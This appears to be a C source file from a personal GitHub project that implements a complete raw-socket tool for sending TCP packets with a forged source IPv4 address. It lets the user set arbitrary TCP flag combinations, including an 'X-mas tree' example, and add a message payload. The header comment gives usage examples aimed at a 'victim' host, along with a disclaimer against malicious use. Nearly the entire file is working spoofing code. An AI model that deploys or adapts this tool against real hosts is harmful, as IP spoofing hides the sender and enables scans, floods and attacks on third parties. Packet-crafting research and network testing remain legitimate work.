/*
    Purpose:
        Demonstrate a PoC for dealing with raw sockets. The driver for this 
        was to provide an interface for spoofing a source IPv4 address or 
        hostname.

        This is a proof of concept and is not intended to:
        - Be free of bugs
        - Be used maliciously
        - Target any asset without prior authorization
        - Be modified with any intent outside of personal research or learning
        ** See the license that should accompany this README and code.
    Developer:
        Ray Daley (https://github.com/darkestb4light)
    Note:
        To get deeper than the typical app layer, we need to deal with raw 
        sockets. This requires elevated privileges since you could do evil 
        things. 

        The source argument passed will be inputted into the source address 
        field of the IP header. The destination address will be inputted 
        into the destination field of the IP header. The destination port 
        will be placed into the destination port field of the TCP header.
        The intent would be to use a source address that is NOT the real 
        source address or hostname, thereby creating a "spoof" scenario.

        On BSD systems (OSX and FREEBSD), spoofing 127.0.0.1 causes sendto(2) 
        to fail with: "Can't assign requested address". Use another source 
        address or hostname.
		
		If compiled via Cygwin on Windows:
		- Ensure you launch your terminal as "Administrator"
		- Header tcp.h (v8.1) does not support CWR or ECE :(
    Compile: 
        $ gcc -D <TARGET-OS> -o spoof spoof.c

        Where <TARGET-OS> is one of: LINUX, FREEBSD, OSX, or CYGWIN (depending 
		on the platform you are compiling on).
    Usage: 
        spoof [options] <arguments>
        spoof <arguments> [options]

        [Options]
        -f <tcpflag> # One or more TCP flags to enable. If using
                     # more than one flag, each should be appended
                     # together (e.g. ASRF). The available flags are:
                     # A or a (enables the ACK bit)
                     # C or c (enables the CWR bit)
                     # E or e (enables the ECE bit)
                     # F or f (enables the FIN bit)
                     # P or p (enables the PSH bit)
                     # R or r (enables the RST bit)
                     # S or s (enables the SYN bit)
                     # U or u (enables the URG bit)
        -m <message> # Optional message to send in the packet
        
        [Arguments]
        -s <src>     # Source IPv4 address or hostname to spoof
        -d <dst>     # Destination IPv4 address or hostname of victim
        -p <dport>   # Destination port to send spoofed TCP packet

        Execute (example 1):
        
        $ sudo ./spoof -s 123.45.67.8 -d 192.168.0.10 -p 55555

        The above will not set any TCP flags, spoof the source address 
        "123.45.67.8", and send a packet to the destination "192.168.0.10" 
        over TCP port of 55555.

        Execute (example 2):

        $ sudo ./spoof -f FPU -d my.victim.com -p 1337 -s foobar.com 

        The above will set the FIN/PSH/URG bits (AKA X-mas tree attack), spoof 
        the source address "foobar.com", and send a packet to the destination 
        "my.victim.com" over TCP port of 1337.

        Execute (example 3):

        $ sudo ./spoof -f PA -d my.victim.com -p 1337 -s l84dinner.com -m "Sp00fing 4 lulz"

        The above will set the PSH/ACK bits, spoof the source address "l84dinner.com", 
        send a packet containing a data payload of "Sp00fing 4 lulz" to the destination 
        "my.victim.com" over TCP port of 1337.
*/

#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#ifdef LINUX
    #include <linux/ip.h>
    #include <linux/tcp.h>
#elif defined(FREEBSD) || defined(OSX) || defined(CYGWIN)
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <netinet/tcp.h>
#else
    #error Target OS macro not specified or unsupported.
    #error Use supported macro: -D LINUX, -D FREEBSD, -D OSX, or -D CYGWIN
    #error Aborting compilation.
#endif

#define NAME	        "spoof"
#define MAX_ARGS        5
#define REQ_ARG_OFFSET  2       /* index where required args start */
#define MAX_FLAGS       8
#define HOST_SZ         255
#define MAX_DATALEN     128

/* Flags for IP header */
#define IP_HDRLEN       5       /* header length */
#define IP_VER          4       /* version */
#define IP_TYPEOFSERV   0       /* type of service */
#define IP_FRAGOFF      0       /* fragment offset */
#define IP_TIMETOLIVE   64      /* time to live */
#define IP_PROTO        6       /* protocol */

/* Flags for TCP header */
#define TCP_DATAOFF     5       /* data offset */
#define TCP_WINDOW      0       /* window size */
#define TCP_URGPTR      0       /* urgent pointer */

struct tcp_ph                   /* pseudo header per rfc793 */
{
    u_int32_t   saddr;
    u_int32_t   daddr;
    u_int8_t    zero;
    u_int8_t    proto;
    u_int16_t   length;
};

unsigned short csum(unsigned short *, int); /* derived from rfc 1071 / rfc793 */
void usage(void);

int main(int argc, char **argv)
{
    int                 i, j, optflag[MAX_ARGS] = {0}, res, dport,
                        sd, pktsz, datalen = 0, optval = 1, ppktsz;
    char                *pkt = NULL, *flag, *src, *dst, *data = NULL, *ppkt = NULL,
                        *opt[MAX_ARGS] = {"-f", "-m", "-s", "-d", "-p"},
                        tcpflags[MAX_FLAGS][2] = {{'a', '0',},
                                                  {'c', '0',},
                                                  {'e', '0',},
                                                  {'f', '0',}, 
                                                  {'p', '0',},
                                                  {'r', '0',},
                                                  {'s', '0',},
                                                  {'u', '0'}};
    struct addrinfo     hints, *result;
    struct sockaddr_in  sa_in, *saddr, *daddr;
    struct tcphdr       tcp_hdr;
    struct tcp_ph       ph;
	
    /* process arguments */
    for(i = 1; i != argc; ++i)
    {
        if(strncmp(argv[i], opt[0], 3) == 0){
            if(argv[i+1] == NULL){
                fprintf(stderr, "%s: %s: %s\n", NAME, argv[i], 
                    "option requires at least one valid TCP flag");
                usage();
            }
            flag = argv[++i];
            while(*flag != '\0')
            {
                optflag[0] = 0;
                for(j = 0; j != MAX_FLAGS; ++j)
                {
                    if(tolower(*flag) == *tcpflags[j]){
                        optflag[0] = 1;
                        tcpflags[j][1] = '1';
                        break;
                    }
                }
                if(! optflag[0]){
                    fprintf(stderr, "%s: %s: %s: %c\n", NAME, argv[i-1], 
                        "invalid TCP flag", *flag);
                    usage();
                }
                switch(*flag){
                case 'A':
                case 'a':
                    printf("%s: flag: ACK bit on\n", NAME);
                    break;
                case 'C':
                case 'c':
                    printf("%s: flag: CWR bit on\n", NAME);
                    break;
                case 'E':
                case 'e':
                    printf("%s: flag: ECE bit on\n", NAME);
                    break;
                case 'F':
                case 'f':
                    printf("%s: flag: FIN bit on\n", NAME);
                    break;
                case 'P':
                case 'p':
                    printf("%s: flag: PSH bit on\n", NAME);
                    break;
                case 'R':
                case 'r':
                    printf("%s: flag: RST bit on\n", NAME);
                    break;
                case 'S':
                case 's':
                    printf("%s: flag: SYN bit on\n", NAME);
                    break;
                case 'U':
                case 'u':
                    printf("%s: flag: URG bit on\n", NAME);
                }
                flag++;
            }
        }else if(strncmp(argv[i], opt[1], 3) == 0){
            if(argv[i+1] == NULL){
                fprintf(stderr, "%s: %s: %s\n", NAME, argv[i], 
                    "option requires at least one character or an empty string");
                usage();
            }
            if((data = (char *) malloc(MAX_DATALEN+1)) == NULL){
                fprintf(stderr, "%s: message: malloc: %s\n", NAME, strerror(errno));
                exit(1);
            }
            optflag[1] = 0;
            memset(data, '\0', MAX_DATALEN+1);
            if((datalen = strlen(argv[++i])) <= MAX_DATALEN)
                memcpy(data, argv[i], datalen);
            else
              memcpy(data, argv[i], MAX_DATALEN);  
            optflag[1] = 1;
            printf("%s: message: %s (%d %s)\n", NAME, data, datalen, (datalen == 1) ? "byte" : "bytes");
        }else{
            if(strncmp(argv[i], opt[2], 3) == 0){
                if(argv[i+1] == NULL) break;
                optflag[2] = 0;
                if((src = (char *) malloc(HOST_SZ)) == NULL){
                    fprintf(stderr, "%s: src: malloc: %s\n", NAME, strerror(errno));
                    exit(1);
                }
                memset(&hints, 0, sizeof(struct addrinfo));
                memset(src, 0, HOST_SZ);
                hints.ai_family = AF_INET;
                if((res = getaddrinfo(argv[++i], NULL, &hints, &result)) != 0){
                    fprintf(stderr, "%s: src: getaddrinfo: %s\n", NAME, gai_strerror(res));
                    exit(1);
                }
                saddr = (struct sockaddr_in *) result->ai_addr;
                memmove(src, inet_ntoa(saddr->sin_addr), HOST_SZ);
                optflag[2] = 1;
                printf("%s: source IP: %s\n", NAME, src);
            }else if(strncmp(argv[i], opt[3], 3) == 0){
                if(argv[i+1] == NULL) break;
                optflag[3] = 0;
                if((dst = (char *) malloc(HOST_SZ)) == NULL){
                    fprintf(stderr, "%s: dst: malloc: %s\n", NAME, strerror(errno));
                    exit(1);
                }
                memset(&hints, 0, sizeof(struct addrinfo));
                memset(dst, 0, HOST_SZ);
                hints.ai_family = AF_INET;   
                if((res = getaddrinfo(argv[++i], NULL, &hints, &result)) != 0){
                    fprintf(stderr, "%s: dst: getaddrinfo: %s\n", NAME, gai_strerror(res));
                    exit(1);
                }
                daddr = (struct sockaddr_in *) result->ai_addr;
                memmove(dst, inet_ntoa(daddr->sin_addr), HOST_SZ);
                optflag[3] = 1; 
                printf("%s: destination IP: %s\n", NAME, dst);
            }else if(strncmp(argv[i], opt[4], 3) == 0){
                if(argv[i+1] == NULL) break;
                optflag[4] = 0;
                dport = strtol(argv[++i], 0, 10);
                if(dport < 0 || dport > 65535){
                    fprintf(stderr, "%s: destination port outside of range: %d\n", NAME, dport);
                    exit(1);
                }
                optflag[4] = 1;
                printf("%s: destination port: %d\n", NAME, dport);
            }else{
                fprintf(stderr, "%s: invalid argument passed: %s\n", NAME, argv[i]);
                usage();
            }
        }
    }
    
    for(i = REQ_ARG_OFFSET; i != MAX_ARGS; ++i)
    {
        if(! optflag[i]){
            fprintf(stderr, "%s: argument (or parameter to it) required: %s\n", NAME, opt[i]);
            usage();
        }
    }
    
    /* socket address */
    sa_in.sin_family = AF_INET;
    sa_in.sin_port = htons(dport);
    sa_in.sin_addr.s_addr = inet_addr(dst);
    
    srand(time(0)); /* get some better entropy for rand(3) */
     
#ifdef LINUX
    struct iphdr ip_hdr;
	
    /* IP header */	
    ip_hdr.ihl = IP_HDRLEN;
    ip_hdr.version = IP_VER;
    ip_hdr.tos = IP_TYPEOFSERV;
    ip_hdr.tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + datalen;
    ip_hdr.frag_off = IP_FRAGOFF;
    ip_hdr.ttl = IP_TIMETOLIVE;
    ip_hdr.protocol = IP_PROTO;
    ip_hdr.check = 0;
    ip_hdr.id = htons(rand() % 65535);
    ip_hdr.saddr = inet_addr(src);
    ip_hdr.daddr = inet_addr(dst);  
	
    /* TCP header */
    tcp_hdr.doff = TCP_DATAOFF;
    tcp_hdr.ack = strtol(&(tcpflags[0][1]), 0, 10);
    tcp_hdr.cwr = strtol(&(tcpflags[1][1]), 0, 10);
    tcp_hdr.ece = strtol(&(tcpflags[2][1]), 0, 10);
    tcp_hdr.fin = strtol(&(tcpflags[3][1]), 0, 10);
    tcp_hdr.psh = strtol(&(tcpflags[4][1]), 0, 10);
    tcp_hdr.rst = strtol(&(tcpflags[5][1]), 0, 10);
    tcp_hdr.syn = strtol(&(tcpflags[6][1]), 0, 10);
    tcp_hdr.urg = strtol(&(tcpflags[7][1]), 0, 10);
    tcp_hdr.check = 0;
    tcp_hdr.window = htons(TCP_WINDOW);
    tcp_hdr.urg_ptr = htons(TCP_URGPTR);
    tcp_hdr.source = htons(rand() % 65535);
    tcp_hdr.dest = htons(dport);
    tcp_hdr.seq = htonl(rand() % UINT_MAX);
    tcp_hdr.ack_seq = htonl(0);
#elif defined(FREEBSD) || defined(OSX) || defined(CYGWIN)
    struct ip ip_hdr;
    unsigned int tcp_flags = 0;
	
    /* IP header */	
    ip_hdr.ip_hl = IP_HDRLEN;
    ip_hdr.ip_v = IP_VER;
    ip_hdr.ip_tos = IP_TYPEOFSERV;
    ip_hdr.ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + datalen;
    ip_hdr.ip_off = IP_FRAGOFF;
    ip_hdr.ip_ttl = IP_TIMETOLIVE;
    ip_hdr.ip_p = IP_PROTO;
    ip_hdr.ip_sum = 0;
    ip_hdr.ip_id = htons(rand() % 65535);
    ip_hdr.ip_src.s_addr = inet_addr(src);
    ip_hdr.ip_dst.s_addr = inet_addr(dst);

    /* TCP header */
    tcp_hdr.th_off = TCP_DATAOFF;
    if(strtol(&(tcpflags[0][1]), 0, 10)) tcp_flags |= TH_ACK;
#ifndef CYGWIN /* CWR and ECE bits not supported in tcp.h v8.1 */
    if(strtol(&(tcpflags[1][1]), 0, 10)) tcp_flags |= TH_CWR;
    if(strtol(&(tcpflags[2][1]), 0, 10)) tcp_flags |= TH_ECE;
#endif
    if(strtol(&(tcpflags[3][1]), 0, 10)) tcp_flags |= TH_FIN;
    if(strtol(&(tcpflags[4][1]), 0, 10)) tcp_flags |= TH_PUSH;
    if(strtol(&(tcpflags[5][1]), 0, 10)) tcp_flags |= TH_RST;
    if(strtol(&(tcpflags[6][1]), 0, 10)) tcp_flags |= TH_SYN;
    if(strtol(&(tcpflags[7][1]), 0, 10)) tcp_flags |= TH_URG;
    tcp_hdr.th_flags = tcp_flags;
    tcp_hdr.th_sum = 0;
    tcp_hdr.th_win = htons(TCP_WINDOW);
    tcp_hdr.th_urp = htons(TCP_URGPTR);
    tcp_hdr.th_sport = htons(rand() % 65535);
    tcp_hdr.th_dport = htons(dport);
    tcp_hdr.th_seq = (rand() % UINT_MAX);
    tcp_hdr.th_ack = htonl(0);
#else /* should never fire if macro definitions are in sync */
    fprintf(stderr, "%s: target OS macro integrity issue - aborting setting headers.\n", NAME);
    exit(1);
#endif
	
    /* build packet */
    if(data != NULL){
        if(datalen > 0)
            pktsz = sizeof(ip_hdr) + sizeof(tcp_hdr) + datalen + 1;
        else
            pktsz = sizeof(ip_hdr) + sizeof(tcp_hdr);
    }else{
        pktsz = sizeof(ip_hdr) + sizeof(tcp_hdr);
    }
    
    if((pkt = (char *) malloc(pktsz)) == NULL){
        fprintf(stderr, "%s: pkt: malloc: %s\n", NAME, strerror(errno));
        exit(1);
    }
    
    memset(pkt, '\0', pktsz);
    memcpy(pkt, &ip_hdr, sizeof(ip_hdr));
    memcpy(pkt + sizeof(ip_hdr), &tcp_hdr, sizeof(tcp_hdr));
    if(data != NULL) memcpy(pkt + sizeof(ip_hdr) + sizeof(tcp_hdr), data, datalen);
    
#ifdef LINUX
    ip_hdr.check = csum((unsigned short *) pkt, ip_hdr.tot_len);
    printf("%s: IP checksum: %#X\n", NAME, ip_hdr.check);
#elif defined(FREEBSD) || defined(OSX) || defined(CYGWIN)
    ip_hdr.ip_sum = csum((unsigned short *) pkt, ip_hdr.ip_len);
    printf("%s: IP checksum: %#X\n", NAME, ip_hdr.ip_sum);
#else /* should never fire if macro definitions are in sync */
    fprintf(stderr, "%s: target OS macro integrity issue - aborting IP checksum.\n", NAME);
    exit(1);
#endif
    
    ph.saddr = inet_addr(src);
    ph.daddr = inet_addr(dst);
    ph.zero = 0;
    ph.proto = IP_PROTO;
    
    if(data != NULL){
        ph.length = htons(sizeof(struct tcphdr) + strlen(data));
        ppktsz = sizeof(struct tcp_ph) + sizeof(struct tcphdr) + strlen(data);
    }else{
        ph.length = htons(sizeof(struct tcphdr));
        ppktsz = sizeof(struct tcp_ph) + sizeof(struct tcphdr);
    }

    if((ppkt = (char *) malloc(ppktsz)) == NULL){
        fprintf(stderr, "%s: pseudo pkt: malloc: %s\n", NAME, strerror(errno));
        exit(1);
    }
    
    memcpy(ppkt, &ph, sizeof(struct tcp_ph));
    if(data != NULL) 
        memcpy(ppkt + sizeof(struct tcp_ph), &tcp_hdr, sizeof(struct tcphdr) + strlen(data));
    else
        memcpy(ppkt + sizeof(struct tcp_ph), &tcp_hdr, sizeof(struct tcphdr));

#ifdef LINUX
    tcp_hdr.check = csum((unsigned short *) ppkt, ppktsz);
    printf("%s: TCP checksum: %#X\n", NAME, tcp_hdr.check);
#elif defined(FREEBSD) || defined(OSX) || defined(CYGWIN)
    tcp_hdr.th_sum = csum((unsigned short *) ppkt, ppktsz);
    printf("%s: TCP checksum: %#X\n", NAME, tcp_hdr.th_sum);
#else /* should never fire if macro definitions are in sync */
    fprintf(stderr, "%s: target OS macro integrity issue - aborting TCP checksum.\n", NAME);
    exit(1);
#endif

    printf("%s: packet built\n", NAME);
    
    /* create socket */
    if((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
        fprintf(stderr, "%s: socket: %s\n", NAME, strerror(errno));
        exit(1);
    }
    	
    printf("%s: raw socket descriptor created\n", NAME);
	
    /* set socket options */
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0){
        fprintf(stderr, "%s: setsockopt: %s\n", NAME, strerror(errno));
        exit(1);
    }
	
    printf("%s: socket options set\n", NAME);
    
    /* send packet */
    if(sendto(sd, pkt, pktsz, 0, (struct sockaddr *)&sa_in, sizeof(sa_in)) < 0){
        fprintf(stderr, "%s: sendto: %s\n", NAME, strerror(errno));
        exit(1);
    }

    printf("%s: packet sent from %s to %s:%d\n", NAME, src, dst, dport);

    /* clean up */
    if(data != NULL) free(data);
    if(ppkt != NULL) free(ppkt);
    free(src);
    free(dst);
    freeaddrinfo(result);
    free(pkt);

    exit(0);
}
unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum = 0;
    
    while(nbytes > 1){
        sum += *ptr++;
        nbytes -= 2;
    }
    
    /* add left-over byte, if any */
    if(nbytes > 0)
        sum += *ptr;
    
    /* fold 32-bit sum to 16 bits */
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    
    return (~sum);
}
void usage(void)
{
#ifdef CYGWIN
	fprintf(stderr, "Usage:\n\t%s %s\n\t%s %s %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
#else
    fprintf(stderr, "Usage:\n\t%s %s\n\t%s %s %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
#endif
        NAME, "[options] <arguments>", NAME, "<arguments> [options]\n",
        "\n[Options]\n",
        "-f <tcpflag...>\t# Optional TCP flag(s) to enable. If using\n",
        "\t\t# more than one flag, each should be appended\n",
        "\t\t# together (e.g. ASRF). The available flags are:\n",
        "\t\t# A or a (enables the ACK bit)\n",
#ifndef CYGWIN	/* CWR and ECE bits not supported in tcp.h v8.1 */
        "\t\t# C or c (enables the CWR bit)\n",
        "\t\t# E or e (enables the ECE bit)\n",
#endif
        "\t\t# F or f (enables the FIN bit)\n",
        "\t\t# P or p (enables the PSH bit)\n",
        "\t\t# R or r (enables the RST bit)\n",
        "\t\t# S or s (enables the SYN bit)\n",
        "\t\t# U or u (enables the URG bit)\n",
        "-m <message>\t# Optional message to send in the packet\n",
        "\n[Arguments]\n",
        "-s <src>\t# Source IPv4 address or hostname to spoof\n", 
        "-d <dst>\t# Destination IPv4 address or hostname of victim\n",
        "-p <dport>\t# Destination port to send spoofed TCP packet\n\n");
        
    exit(1);
}
